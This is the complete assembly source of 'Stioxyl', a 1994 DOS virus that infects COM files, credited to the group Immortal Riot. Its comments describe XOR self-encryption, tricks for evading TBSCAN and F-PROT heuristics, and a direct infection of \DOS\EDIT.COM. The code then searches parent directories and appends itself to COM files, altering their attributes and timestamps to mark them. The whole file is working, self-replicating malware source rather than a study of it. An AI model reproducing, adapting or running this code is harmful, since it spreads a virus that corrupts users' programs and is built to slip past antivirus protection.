; ------------------------------------------------------------------------------
;
;                           - Stioxyl -
;       Created by Immortal Riot's destructive development team
;              (c) 1994 The Unforgiven/Immortal Riot 
;
; ------------------------------------------------------------------------------
;               þ   Undetectable COM-infector þ
; ------------------------------------------------------------------------------
.model tiny
.radix 16
.code
org    100h

start:

storbuf db 00,00,00,00            ; for first generation only!

v_start:

mov     sp,102h                   ; get the delta offset so tbscan cant
call    get_delta                 ; flag it as flexible entry point
get_delta:                        ;
mov     bp,word ptr ds:[100h]      
mov     sp,0fffeh                  
sub     bp,offset get_delta       

go_back:

mov     ax,0305h                  ; this code was included to avoid detection
xor     bx,bx                     ; from tbscan. The vsafe disabeling code can
int     16h                       ; be used as well, but f-prot heuristics
				  ; complains about it.
				 
call    en_de_crypt               ; decrypt the virus
jmp     short real_start          ; and continue...

encrypt_value dw 0                ; random xor (encryption) value 

write_virus:

call    en_de_crypt               ; write encrypted copy of the virus
mov     ah,40                     ; 
mov     cx,code_end-v_start       ; # bytes
lea     dx,[bp+v_start]           ; dx:100h         
int     21                        ;
call    en_de_crypt               ; decrypt virus again for further processing
ret

en_de_crypt:

mov     ax,word ptr [bp+encrypt_value]       
lea     si,[bp+real_start]                        
mov     cx,(enc_end-real_start+1)/2

xor_loopie:

xor     word ptr [si],ax          ; encrypts two bytes/loop until all 
inc     si                        ; code between real_start and enc_end
inc     si                        ; are encrypted
loop    xor_loopie
ret

real_start:

get_drive:                        

mov     ah,19h                    ; get drive from where we are executed from
int     21h                       ; check if it's a: or b:
cmp     al,2                      ; if so, return control to the original
jb      quit                      ; program without infecting other files

get_dir:

mov     ah,47h                    ; get directory from where we are
xor     dl,dl                     ; being executed from
lea     si,[bp+code_end+2ch]      ;
int     21h

lea     si,[bp+org_buf]           ; move the firsts 3 bytes
mov     di,100                    ; from the beginning di:100h,
movsw                             ; to a buffer called org_buf
movsb                             ;              

lea     dx,[bp+code_end]          ; set our own dta to code_end, so
mov     ah,1ah                    ; the paramters when findfiles arent
int     21h                       ; destroyed

lea     dx,[bp+direct_infect]     ; if present, infect
call    dirinfect                 ; \dos\edit.com

findfirst:

mov     ah,4e                     ; search for com files
mov     cx,7                      ; any attribute
lea     dx,[bp+com_files]         ; matchine with the extension
find_next:                        ; 'COM'

int     21

jc      dot_dot                   ; no more files, seek next directory!

call    infect                    ; found a find, infect it!

mov     ah,4f                     ; search next file
jmp     short find_next           ; and see if we find one

dot_dot:

mov     ah,3bh                    ; move directory
lea     dx,[bp+ch_dir]            ; to '..'
int     21h

jnc     findfirst                 ; if not '\' => findfirst file
				  ; in the new location
restore_dir:                      

mov     ah,3bh                    ; restore directory
lea     dx,[bp+code_end+2ch]      ; from where we was executed
int     21h                       ; and..

no_more_files:                    ;

mov     dx,80                     ; set the dta to 80h (default)          
mov     ah,1ah
int     21h
quit:                             ;

mov     di,100                    ; return control to original program     
push    di                        ; 
ret                                           

infect:

lea     dx,[bp+code_end+1eh]      ; 1e = adress to filename in ds:dx in our 
				  ; new dta area!
dirinfect:

mov     ax,4301h                  ; set attributes
xor     cx,cx                     ; to nothing
int     21h

open_file:

mov     ax,3d02h                  ; open file 
int     21                        ; in read/write mode

jnc     infect_it                 ; if the file \dos\edit.com doesnt exist
ret                               ; return, and search first comfile

infect_it:

xchg    bx,ax                     ; filehandle in bx

mov     ax,5700                   ; get time/date
int     21

push    dx                        ; save date
push    cx                        ; save time

mov     ah,3f                     ; read the first three bytes
mov     cx,3                      ; of the file to org_buf
lea     dx,[bp+org_buf]  
int     21                                     

mov     ax,word ptr [bp+code_end+16h]          ; get file-time
and     al,00011111b            
cmp     al,00010101b                           ; sec = 10?
je      finish_infect                          ; assume previous infection

cmp     byte ptr [bp+org_buf+1],0F7h           ; dosedit.com after
jz      finish_infect                          ; first infection

cmp     byte ptr [bp+org_buf+1],6Dh            ; command.com
jz      finish_infect                          ;

mov     ax, word ptr [bp+code_end+1ah]         ; virus size * 2
cmp     ax,786d                                ;
jb      finish_infect

cmp     ax,65143d                              ; 1024 * 64 - virus size
ja      finish_infect                          ;

mov     ax,4202                                ; move file-pointer
xor     cx,cx                                  ; to end of file
cwd
int     21

sub     ax,3                                   ; substract bytes
mov     word ptr [bp+first_three+1],ax         ; to our own jump

get_value:

mov     ah,2ch                                 ; get system clock for
int     21h                                    ; 1/100 of a second
jz      get_value                              ; if zero = get new value
mov     word ptr [bp+encrypt_value],dx         ; otherwise, use as enc value
call    write_virus                            ; write virus to end of file

mov     ax,4200                   ; move file-pointer to
xor     cx,cx                     ; top of file
cwd
int     21

mov     ah,40                     ; write our own jump  
mov     cx,3                      ; instruction to the
lea     dx,[bp+first_three]       ; beginning
int     21                                               

finish_infect:                                 

mov     ax,5701h                  ; set back
pop     cx                        ; time
pop     dx                        ; date
and     cl,11100000b              ; but alter the
or      cl,00010101b              ; second value
int     21h                       ;

mov     ah,3eh                    ; close file
int     21

mov     ax,4301h                  ; set back the original file attributes
xor     ch,ch                     ; stamp, on the files we altered
lea     dx,[bp+code_end+1eh]      ; 
mov     cl,byte ptr [bp+code_end+15h]
int     21h

ret                               ; return and continue!

v_name           db   "[Stioxyl] (c) '94 The Unforgiven/Immortal Riot"

direct_infect    db      '\DOS\EDIT.COM',0                         

com_files        db      '*.com',0                 
ch_dir           db      '..',0          ; dot-dot to change directory
first_three      db      0e9,90,90       ; buffer to calculate a new entry
org_buf          db      90,0CDh,20      ; buffer to save first three bytes in

enc_end:         
code_end:
end start
